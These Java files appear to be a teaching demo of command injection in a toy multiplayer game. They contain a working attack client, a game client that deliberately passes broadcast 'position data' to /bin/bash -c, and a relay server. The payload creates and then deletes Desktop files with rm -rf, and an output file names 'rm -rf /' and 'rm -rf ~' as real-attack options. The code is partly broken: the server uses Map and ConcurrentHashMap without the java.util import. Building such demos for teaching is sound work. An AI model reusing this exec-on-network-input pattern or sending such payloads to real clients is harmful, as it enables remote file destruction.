// ============================================================================
// AttackClient.java - The Malicious Client
// ============================================================================

import java.io.*;
import java.net.*;

public class AttackClient {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 12345;
    
    public static void main(String[] args) {
        System.out.println("========================================");
        System.out.println("=== COMMAND INJECTION ATTACK DEMO ===");
        System.out.println("========================================");
        System.out.println("Connecting to server...");
        
        try (
            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            BufferedReader in = new BufferedReader(
                new InputStreamReader(socket.getInputStream())
            );
            PrintWriter out = new PrintWriter(
                socket.getOutputStream(), true
            )
        ) {
            // Read server prompt
            String prompt = in.readLine();
            System.out.println("Server: " + prompt);
            
            // Send attacker name
            String attackerName = "MaliciousPlayer";
            out.println(attackerName);
            System.out.println("Connected as: " + attackerName);
            
            // Wait for connection to establish
            Thread.sleep(1000);
            
            // Craft the malicious payload
            String payload = craftMaliciousPayload();
            
            System.out.println("\n[*] Sending malicious payload...");
            System.out.println("[*] Payload: " + payload);
            System.out.println("\n[!] This payload will:");
            System.out.println("    1. Create dummy files on victim's Desktop");
            System.out.println("    2. Then DELETE them using rm -rf");
            System.out.println("    3. Demonstrate command injection vulnerability");
            
            // Send the payload
            out.println(payload);
            
            System.out.println("\n[*] Payload sent!");
            System.out.println("[*] All vulnerable clients should now execute the command");
            
            // Keep connection alive briefly
            Thread.sleep(3000);
            
            System.out.println("\n[*] Attack complete. Disconnecting...");
            
        } catch (Exception e) {
            System.err.println("[ERROR] Attack failed:");
            e.printStackTrace();
        }
    }
    
    /**
     * Creates a malicious payload that exploits command injection vulnerability
     * This version creates dummy files and then deletes them to demonstrate rm -rf
     * 
     * @return The crafted malicious payload string
     */
    private static String craftMaliciousPayload() {
        // Create a safe demonstration directory and files, then delete them
        String bashCommand = 
            // First, create a demo directory with dummy files
            "mkdir -p ~/Desktop/VULNERABILITY_DEMO && " +
            "echo 'Dummy File 1' > ~/Desktop/VULNERABILITY_DEMO/dummy1.txt && " +
            "echo 'Dummy File 2' > ~/Desktop/VULNERABILITY_DEMO/dummy2.txt && " +
            "echo 'Dummy File 3' > ~/Desktop/VULNERABILITY_DEMO/dummy3.txt && " +
            "echo 'Files created, demonstrating injection...' && " +
            // Wait a moment so user can see files were created
            "sleep 2 && " +
            // Now demonstrate rm -rf on the dummy directory
            "rm -rf ~/Desktop/VULNERABILITY_DEMO && " +
            // Create evidence file showing what happened
            "echo 'SECURITY BREACH DETECTED' > ~/Desktop/ATTACK_PROOF.txt && " +
            "echo 'Command Injection Successful' >> ~/Desktop/ATTACK_PROOF.txt && " +
            "echo 'Attacker executed: rm -rf on dummy directory' >> ~/Desktop/ATTACK_PROOF.txt && " +
            "echo 'Timestamp: '$(date) >> ~/Desktop/ATTACK_PROOF.txt && " +
            "echo '========================================' >> ~/Desktop/ATTACK_PROOF.txt && " +
            "echo 'In a real attack, this could have been:' >> ~/Desktop/ATTACK_PROOF.txt && " +
            "echo 'rm -rf / (DELETE ENTIRE SYSTEM)' >> ~/Desktop/ATTACK_PROOF.txt && " +
            "echo 'rm -rf ~ (DELETE ALL USER FILES)' >> ~/Desktop/ATTACK_PROOF.txt";
        
        // Wrap it in a MOVE command to bypass basic validation
        // The server will broadcast this, and vulnerable clients will execute it
        return "MOVE:100,200; " + bashCommand;
    }
}

// ============================================================================
// MMORPGClient.java - The Vulnerable Client
// ============================================================================

class MMORPGClient {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 12345;
    
    public static void main(String[] args) {
        System.out.println("========================================");
        System.out.println("=== VULNERABLE MMORPG CLIENT ===");
        System.out.println("========================================");
        
        try (
            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            BufferedReader in = new BufferedReader(
                new InputStreamReader(socket.getInputStream())
            );
            PrintWriter out = new PrintWriter(
                socket.getOutputStream(), true
            );
            BufferedReader consoleInput = new BufferedReader(
                new InputStreamReader(System.in)
            )
        ) {
            // Get player name
            System.out.println(in.readLine()); // Prompt for player name
            String playerName = consoleInput.readLine();
            out.println(playerName);
            
            System.out.println("\n[Connected to game server]");
            System.out.println("[Type MOVE:x,y to send position updates]");
            System.out.println("[WARNING: This client is vulnerable to command injection]\n");
            
            // Thread to listen for server messages
            new Thread(() -> {
                String serverMessage;
                try {
                    while ((serverMessage = in.readLine()) != null) {
                        if (serverMessage.startsWith("UPDATE:")) {
                            String[] parts = serverMessage.split(":", 3);
                            
                            if (parts.length >= 3) {
                                String otherPlayerName = parts[1];
                                String positionData = parts[2];
                                System.out.println(
                                    "[Server Update] " + otherPlayerName + 
                                    " is now at " + positionData
                                );
                                
                                // VULNERABILITY: Process position data without validation
                                processUpdate(positionData);
                            }
                        }
                    }
                } catch (IOException e) {
                    System.err.println("[Connection lost]");
                }
            }).start();
            
            // Main input loop
            String userInput;
            while ((userInput = consoleInput.readLine()) != null) {
                if (userInput.startsWith("MOVE:")) {
                    out.println(userInput);
                } else {
                    // Auto-format non-MOVE input
                    out.println("MOVE:" + userInput);
                }
            }
            
        } catch (IOException e) {
            System.err.println("[Error connecting to server]");
            e.printStackTrace();
        }
    }
    
    /**
     * VULNERABLE METHOD - This is where the exploit happens
     * Processes position updates from other players without proper validation
     * 
     * SECURITY FLAW: Executes arbitrary commands embedded in position data
     * 
     * @param positionData The position data received from server (potentially malicious)
     */
    private static void processUpdate(String positionData) {
        try {
            // Check if position data contains a command (separated by semicolon)
            if (positionData.contains(";")) {
                String[] parts = positionData.split(";", 2);
                
                if (parts.length > 1) {
                    String command = parts[1].trim();
                    
                    System.out.println("[!] SECURITY WARNING: Command detected in position data");
                    System.out.println("[!] Executing: " + 
                        (command.length() > 50 ? command.substring(0, 50) + "..." : command));
                    
                    // VULNERABILITY: Execute the command without validation
                    // In a real vulnerable application, this would happen silently
                    Process process = Runtime.getRuntime().exec(
                        new String[]{"/bin/bash", "-c", command}
                    );
                    
                    // Capture output to show what happened
                    BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getInputStream())
                    );
                    String line;
                    while ((line = reader.readLine()) != null) {
                        System.out.println("[Command Output] " + line);
                    }
                    
                    int exitCode = process.waitFor();
                    
                    if (exitCode == 0) {
                        System.out.println("[!] Command executed successfully");
                        System.out.println("[!] CHECK YOUR DESKTOP for ATTACK_PROOF.txt");
                    } else {
                        System.out.println("[!] Command execution completed with code: " + exitCode);
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("[Error processing update: " + e.getMessage() + "]");
        }
    }
}

// ============================================================================
// MMORPGServer.java - The Game Server
// ============================================================================

class MMORPGServer {
    private static final int PORT = 12345;
    private static Map<String, PlayerHandler> players = 
            new ConcurrentHashMap<>();
    
    public static void main(String[] args) {
        System.out.println("========================================");
        System.out.println("=== MMORPG SERVER STARTING ===");
        System.out.println("========================================");
        System.out.println("Listening on port " + PORT);
        System.out.println("Waiting for players to connect...\n");
        
        try (ServerSocket serverSocket = new ServerSocket(PORT)) {
            while (true) {
                Socket clientSocket = serverSocket.accept();
                PlayerHandler playerHandler = new PlayerHandler(clientSocket);
                new Thread(playerHandler).start();
            }
        } catch (IOException e) {
            System.err.println("Server error: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    /**
     * Broadcasts a message to all connected players except the sender
     */
    public static synchronized void broadcast(String message, PlayerHandler sender) {
        for (PlayerHandler player : players.values()) {
            if (player != sender) {
                player.sendMessage(message);
            }
        }
    }
    
    /**
     * Updates and broadcasts a player's position to all other players
     * SECURITY ISSUE: Does not validate position data for malicious content
     */
    public static synchronized void updatePlayerPosition(
            String playerName, 
            String positionData
    ) {
        String message = "UPDATE:" + playerName + ":" + positionData;
        System.out.println("[Broadcasting] " + playerName + " -> " + positionData);
        broadcast(message, players.get(playerName));
    }
    
    public static synchronized void addPlayer(
            String playerName, 
            PlayerHandler playerHandler
    ) {
        players.put(playerName, playerHandler);
        System.out.println("[Player Joined] " + playerName + 
                         " (Total players: " + players.size() + ")");
    }
    
    public static synchronized void removePlayer(String playerName) {
        players.remove(playerName);
        System.out.println("[Player Left] " + playerName + 
                         " (Total players: " + players.size() + ")");
    }
}

/**
 * Handles individual player connections
 */
class PlayerHandler implements Runnable {
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private String playerName;
    
    public PlayerHandler(Socket socket) {
        this.socket = socket;
    }
    
    @Override
    public void run() {
        try {
            in = new BufferedReader(
                new InputStreamReader(socket.getInputStream())
            );
            out = new PrintWriter(socket.getOutputStream(), true);
            
            // Get player name
            out.println("Enter your player name: ");
            playerName = in.readLine();
            MMORPGServer.addPlayer(playerName, this);
            
            // Process messages from this player
            String message;
            while ((message = in.readLine()) != null) {
                if (message.startsWith("MOVE:")) {
                    // Extract position data
                    // SECURITY FLAW: No validation of position data
                    String positionData = message.substring(5);
                    MMORPGServer.updatePlayerPosition(playerName, positionData);
                }
            }
            
        } catch (IOException e) {
            System.err.println("[Error handling player " + playerName + "]");
        } finally {
            cleanup();
        }
    }
    
    private void cleanup() {
        try {
            MMORPGServer.removePlayer(playerName);
            socket.close();
        } catch (IOException e) {
            System.err.println("[Error closing connection for " + playerName + "]");
        }
    }
    
    public void sendMessage(String message) {
        out.println(message);
    }
}
